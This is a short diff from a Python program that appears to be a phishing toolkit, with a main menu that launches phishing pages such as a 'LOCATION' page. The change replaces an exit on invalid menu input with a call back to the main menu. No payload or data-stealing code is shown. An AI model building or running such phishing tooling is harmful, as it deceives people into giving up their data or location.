@@ -236,7 +236,7 @@ def start_main_menu():
         start_phishing_page('LOCATION', customOption)
 
     else:
-        simple_informant.exit_message(port)
+        start_main_menu()
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
